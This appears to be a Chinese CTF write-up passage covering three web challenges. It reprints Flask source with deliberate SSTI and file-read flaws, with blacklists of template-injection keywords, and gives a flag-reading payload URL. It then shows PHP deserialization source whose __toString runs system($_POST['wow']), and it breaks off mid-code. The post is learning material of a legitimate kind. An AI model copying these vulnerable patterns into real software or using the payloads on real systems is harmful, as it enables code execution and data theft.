+</span></span><span class="line"><span class="cl">from a.b.c.d.secret import secret_key  # 潜在风险：secret_key可能暴露在源码中
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">app = Flask(__name__)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 安全风险：黑名单不完整，可能被绕过
+</span></span><span class="line"><span class="cl">black_list = [&#39;{&#39;, &#39;}&#39;, &#39;popen&#39;, &#39;os&#39;, &#39;import&#39;, &#39;eval&#39;, &#39;_&#39;, &#39;system&#39;, &#39;read&#39;, &#39;base&#39;, &#39;globals&#39;]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def waf(name):
+</span></span><span class="line"><span class="cl">    &#34;&#34;&#34;基础WAF过滤&#34;&#34;&#34;
+</span></span><span class="line"><span class="cl">    for x in black_list:
+</span></span><span class="line"><span class="cl">        if x in name.lower():
+</span></span><span class="line"><span class="cl">            return True
+</span></span><span class="line"><span class="cl">    return False
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def is_typable(char):
+</span></span><span class="line"><span class="cl">    &#34;&#34;&#34;检查字符是否可打印&#34;&#34;&#34;
+</span></span><span class="line"><span class="cl">    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace
+</span></span><span class="line"><span class="cl">    return char in typable_chars
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/&#39;)
+</span></span><span class="line"><span class="cl">def home():
+</span></span><span class="line"><span class="cl">    &#34;&#34;&#34;首页路由&#34;&#34;&#34;
+</span></span><span class="line"><span class="cl">    return send_from_directory(&#39;static&#39;, &#39;index.html&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/jingu&#39;, methods=[&#39;POST&#39;])
+</span></span><span class="line"><span class="cl">def greet():
+</span></span><span class="line"><span class="cl">    &#34;&#34;&#34;核心处理路由（存在严重漏洞）&#34;&#34;&#34;
+</span></span><span class="line"><span class="cl">    template1 = &#34;&#34;
+</span></span><span class="line"><span class="cl">    template2 = &#34;&#34;
+</span></span><span class="line"><span class="cl">    name = request.form.get(&#39;name&#39;)
+</span></span><span class="line"><span class="cl">    template = f&#39;{name}&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    # WAF过滤
+</span></span><span class="line"><span class="cl">    if waf(name):
+</span></span><span class="line"><span class="cl">        template = &#39;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹\nImage&#39;
+</span></span><span class="line"><span class="cl">    else:
+</span></span><span class="line"><span class="cl">        # 检查字符是否可打印
+</span></span><span class="line"><span class="cl">        k = 0
+</span></span><span class="line"><span class="cl">        for i in name:
+</span></span><span class="line"><span class="cl">            if not is_typable(i):
+</span></span><span class="line"><span class="cl">                k = 1
+</span></span><span class="line"><span class="cl">                break
+</span></span><span class="line"><span class="cl">        if k == 1:
+</span></span><span class="line"><span class="cl">            # 检查是否包含secret_key前缀（逻辑缺陷）
+</span></span><span class="line"><span class="cl">            if not (secret_key[:2] in name and secret_key[2:]):
+</span></span><span class="line"><span class="cl">                return render_template_string(&#39;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧\n\n再去西行历练历练\nImage&#39;)
+</span></span><span class="line"><span class="cl">            # 模板注入漏洞：替换为{{}}语法
+</span></span><span class="line"><span class="cl">            template1 = &#34;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“{{}}”\n最后，如果你用了cat，就可以见到齐天大圣了\n&#34;
+</span></span><span class="line"><span class="cl">            template = template.replace(&#34;直面&#34;, &#34;{{&#34;).replace(&#34;天命&#34;, &#34;}}&#34;)
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        # 检查cat关键词
+</span></span><span class="line"><span class="cl">        if &#34;cat&#34; in template:
+</span></span><span class="line"><span class="cl">            template2 = &#39;\n或许你这只叫天命人的猴子，真的能做到？\nImage&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    # 渲染模板（存在注入风险）
+</span></span><span class="line"><span class="cl">    try:
+</span></span><span class="line"><span class="cl">        return template1 + render_template_string(template) + render_template_string(template2)
+</span></span><span class="line"><span class="cl">    except Exception as e:
+</span></span><span class="line"><span class="cl">        return f&#34;500报错了，查询语句如下：\n{template}&#34;, 400
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/hint&#39;, methods=[&#39;GET&#39;])
+</span></span><span class="line"><span class="cl">def hinter():
+</span></span><span class="line"><span class="cl">    &#34;&#34;&#34;提示路由&#34;&#34;&#34;
+</span></span><span class="line"><span class="cl">    return render_template_string(&#34;hint：\n有一个由4个小写英文字母组成的路由，去那里看看吧，天命人!&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/aazz&#39;, methods=[&#39;GET&#39;])
+</span></span><span class="line"><span class="cl">def finder():
+</span></span><span class="line"><span class="cl">    &#34;&#34;&#34;文件读取路由（存在路径遍历漏洞）&#34;&#34;&#34;
+</span></span><span class="line"><span class="cl">    filename = request.args.get(&#39;filename&#39;, &#39;&#39;)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    # 初始处理
+</span></span><span class="line"><span class="cl">    if not filename:
+</span></span><span class="line"><span class="cl">        return send_from_directory(&#39;static&#39;, &#39;file.html&#39;)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    # 文件名检查（逻辑错误：原代码存在语法问题）
+</span></span><span class="line"><span class="cl">    if not filename.replace(&#39;_&#39;, &#39;&#39;).isalnum():
+</span></span><span class="line"><span class="cl">        return jsonify({&#39;error&#39;: &#39;只允许字母和数字！&#39;}), 400
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    # 路径遍历漏洞：直接使用用户输入的filename
+</span></span><span class="line"><span class="cl">    if os.path.isfile(filename):
+</span></span><span class="line"><span class="cl">        try:
+</span></span><span class="line"><span class="cl">            with open(filename, &#39;r&#39;) as file:
+</span></span><span class="line"><span class="cl">                content = file.read()
+</span></span><span class="line"><span class="cl">            return content
+</span></span><span class="line"><span class="cl">        except Exception as e:
+</span></span><span class="line"><span class="cl">            return jsonify({&#39;error&#39;: str(e)}), 500
+</span></span><span class="line"><span class="cl">    else:
+</span></span><span class="line"><span class="cl">        return jsonify({&#39;error&#39;: &#39;路径不存在或者路径非法&#39;}), 404
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if __name__ == &#39;__main__&#39;:
+</span></span><span class="line"><span class="cl">    app.run(host=&#39;0.0.0.0&#39;, port=80)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这道题本来是考SSTI的，但怎么都绕不过防火墙，但有非预期解</p>
+<p>我们知道 /aazz 目录下可以传参读取文件的</p>
+<p>我们直接读flag：</p>
+<blockquote>
+<p>Payload: <code>http://node1.tgctf.woooo.tech:30904/aazz?filename=flag</code></p></blockquote>
+<p>读到flag</p>
+<hr>
+<h2 id="直面天命复仇">直面天命（复仇）
+</h2><p>这道题我没做出来，把源码放在这方便后面复现</p>
+<p>复仇直接ban了传参读文件功能，直接回显源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">import os
+</span></span><span class="line"><span class="cl">import string
+</span></span><span class="line"><span class="cl">from flask import Flask, request, render_template_string, jsonify, send_from_directory
+</span></span><span class="line"><span class="cl">from a.b.c.d.secret import secret_key
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">app = Flask(__name__)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">black_list=[&#39;lipsum&#39;,&#39;|&#39;,&#39;%&#39;,&#39;{&#39;,&#39;}&#39;,&#39;map&#39;,&#39;chr&#39;, &#39;value&#39;, &#39;get&#39;, &#34;url&#34;, &#39;pop&#39;,&#39;include&#39;,&#39;popen&#39;,&#39;os&#39;,&#39;import&#39;,&#39;eval&#39;,&#39;_&#39;,&#39;system&#39;,&#39;read&#39;,&#39;base&#39;,&#39;globals&#39;,&#39;_.&#39;,&#39;set&#39;,&#39;application&#39;,&#39;getitem&#39;,&#39;request&#39;, &#39;+&#39;, &#39;init&#39;, &#39;arg&#39;, &#39;config&#39;, &#39;app&#39;, &#39;self&#39;]
+</span></span><span class="line"><span class="cl">def waf(name):
+</span></span><span class="line"><span class="cl">    for x in black_list:
+</span></span><span class="line"><span class="cl">        if x in name.lower():
+</span></span><span class="line"><span class="cl">            return True
+</span></span><span class="line"><span class="cl">    return False
+</span></span><span class="line"><span class="cl">def is_typable(char):
+</span></span><span class="line"><span class="cl">    # 定义可通过标准 QWERTY 键盘输入的字符集
+</span></span><span class="line"><span class="cl">    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace
+</span></span><span class="line"><span class="cl">    return char in typable_chars
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/&#39;)
+</span></span><span class="line"><span class="cl">def home():
+</span></span><span class="line"><span class="cl">    return send_from_directory(&#39;static&#39;, &#39;index.html&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/jingu&#39;, methods=[&#39;POST&#39;])
+</span></span><span class="line"><span class="cl">def greet():
+</span></span><span class="line"><span class="cl">    template1=&#34;&#34;
+</span></span><span class="line"><span class="cl">    template2=&#34;&#34;
+</span></span><span class="line"><span class="cl">    name = request.form.get(&#39;name&#39;)
+</span></span><span class="line"><span class="cl">    template = f&#39;{name}&#39;
+</span></span><span class="line"><span class="cl">    if waf(name):
+</span></span><span class="line"><span class="cl">        template = &#39;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹
+</span></span><span class="line"><span class="cl">Image&#39;
+</span></span><span class="line"><span class="cl">    else:
+</span></span><span class="line"><span class="cl">        k=0
+</span></span><span class="line"><span class="cl">        for i in name:
+</span></span><span class="line"><span class="cl">            if is_typable(i):
+</span></span><span class="line"><span class="cl">                continue
+</span></span><span class="line"><span class="cl">            k=1
+</span></span><span class="line"><span class="cl">            break
+</span></span><span class="line"><span class="cl">        if k==1:
+</span></span><span class="line"><span class="cl">            if not (secret_key[:2] in name and secret_key[2:]):
+</span></span><span class="line"><span class="cl">                template = &#39;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">再去西行历练历练
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Image&#39;
+</span></span><span class="line"><span class="cl">                return render_template_string(template)
+</span></span><span class="line"><span class="cl">            template1 = &#34;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“{{}}”
+</span></span><span class="line"><span class="cl">最后，如果你用了cat，就可以见到齐天大圣了
+</span></span><span class="line"><span class="cl">&#34;
+</span></span><span class="line"><span class="cl">            template= template.replace(&#34;天命&#34;,&#34;{{&#34;).replace(&#34;难违&#34;,&#34;}}&#34;)
+</span></span><span class="line"><span class="cl">            template = template
+</span></span><span class="line"><span class="cl">    if &#34;cat&#34; in template:
+</span></span><span class="line"><span class="cl">        template2 = &#39;
+</span></span><span class="line"><span class="cl">或许你这只叫天命人的猴子，真的能做到？
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Image&#39;
+</span></span><span class="line"><span class="cl">    try:
+</span></span><span class="line"><span class="cl">        return template1+render_template_string(template)+render_template_string(template2)
+</span></span><span class="line"><span class="cl">    except Exception as e:
+</span></span><span class="line"><span class="cl">        error_message = f&#34;500报错了，查询语句如下：
+</span></span><span class="line"><span class="cl">{template}&#34;
+</span></span><span class="line"><span class="cl">        return error_message, 400
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/hint&#39;, methods=[&#39;GET&#39;])
+</span></span><span class="line"><span class="cl">def hinter():
+</span></span><span class="line"><span class="cl">    template=&#34;hint：
+</span></span><span class="line"><span class="cl">有一个aazz路由，去那里看看吧，天命人!&#34;
+</span></span><span class="line"><span class="cl">    return render_template_string(template)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/aazz&#39;, methods=[&#39;GET&#39;])
+</span></span><span class="line"><span class="cl">def finder():
+</span></span><span class="line"><span class="cl">    with open(__file__, &#39;r&#39;) as f:
+</span></span><span class="line"><span class="cl">        source_code = f.read()
+</span></span><span class="line"><span class="cl">    return f&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{source_code}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&#34;, 200, {&#39;Content-Type&#39;: &#39;text/html; charset=utf-8&#39;}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if __name__ == &#39;__main__&#39;:
+</span></span><span class="line"><span class="cl">    app.run(host=&#39;0.0.0.0&#39;, port=80)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>很难绕的 SSTI 一直在爆500错误</p>
+<hr>
+<h2 id="什么文件上传">什么文件上传？
+</h2><p>打开以为是文件上传，但是传什么文件都不行，F12看一眼，提示“机器人是什么”</p>
+<p>到robots协议里看一眼：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">User-Agent: *
+</span></span><span class="line"><span class="cl">Disallow: /admin/
+</span></span><span class="line"><span class="cl">Disallow: /private/
+</span></span><span class="line"><span class="cl">Disallow: /baidu
+</span></span><span class="line"><span class="cl">Disallow: /s?
+</span></span><span class="line"><span class="cl">Disallow: /unlink
+</span></span><span class="line"><span class="cl">Disallow: /phar
+</span></span><span class="line"><span class="cl">Disallow: !@*($^&amp;*!@^&amp;!*(@$# &lt;--!文件上传后缀是三个小写字母 !@#$*&amp;^(!%@#$#^&amp;!--&gt;
+</span></span><span class="line"><span class="cl">Disallow: /class.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进 class.php</p>
+<p>发现是PHP反序列化：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl">    <span class="n">highlight_file</span><span class="p">(</span><span class="n">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">function</span> <span class="n">best64_decode</span><span class="p">(</span><span class="o">$</span><span class="nb">str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">base64_decode</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="o">$</span><span class="nb">str</span><span class="p">)))));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="n">yesterday</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="o">$</span><span class="n">learn</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="o">$</span><span class="n">study</span><span class="o">=</span><span class="s2">&#34;study&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="o">$</span><span class="n">try</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="n">function</span> <span class="n">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">learn</span> <span class="o">=</span> <span class="s2">&#34;learn&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="n">function</span> <span class="n">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">echo</span> <span class="s2">&#34;You studied hard yesterday.&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">study</span><span class="o">-&gt;</span><span class="n">hard</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="n">today</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="o">$</span><span class="n">doing</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="o">$</span><span class="n">did</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="o">$</span><span class="n">done</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="n">function</span> <span class="n">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">did</span> <span class="o">=</span> <span class="s2">&#34;What you did makes you outstanding.&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="n">function</span> <span class="n">__call</span><span class="p">(</span><span class="o">$</span><span class="n">arg1</span><span class="p">,</span> <span class="o">$</span><span class="n">arg2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">done</span> <span class="o">=</span> <span class="s2">&#34;And what you&#39;ve done has given you a choice.&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">echo</span> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">done</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="n">md5</span><span class="p">(</span><span class="n">md5</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">doing</span><span class="p">))</span><span class="o">==</span><span class="mi">666</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">doing</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">doing</span><span class="o">-&gt;</span><span class="n">better</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="n">tommoraw</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="o">$</span><span class="n">good</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="o">$</span><span class="n">bad</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="o">$</span><span class="n">soso</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="n">function</span> <span class="n">__invoke</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">good</span><span class="o">=</span><span class="s2">&#34;You&#39;ll be good tommoraw!&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">echo</span> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">good</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="n">function</span> <span class="n">__get</span><span class="p">(</span><span class="o">$</span><span class="n">arg1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">bad</span><span class="o">=</span><span class="s2">&#34;You&#39;ll be bad tommoraw!&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="n">future</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">private</span> <span class="o">$</span><span class="n">impossible</span><span class="o">=</span><span class="s2">&#34;How can you get here?&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">private</span> <span class="o">$</span><span class="n">out</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">private</span> <span class="o">$</span><span class="n">no</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="o">$</span><span class="n">useful1</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful2</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful3</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful4</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful5</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful6</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful7</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful8</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful9</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful10</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful11</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful12</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful13</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful14</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful15</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful16</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful17</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful18</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful19</span><span class="p">;</span><span class="n">public</span> <span class="o">$</span><span class="n">useful20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="n">function</span> <span class="n">__set</span><span class="p">(</span><span class="o">$</span><span class="n">arg1</span><span class="p">,</span> <span class="o">$</span><span class="n">arg2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">out</span><span class="o">-&gt;</span><span class="n">useful7</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">echo</span> <span class="s2">&#34;Seven is my lucky number&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="n">function</span> <span class="n">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">echo</span> <span class="s2">&#34;This is your future.&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">system</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s2">&#34;wow&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;win&#34;</span><span class="p">;</span>
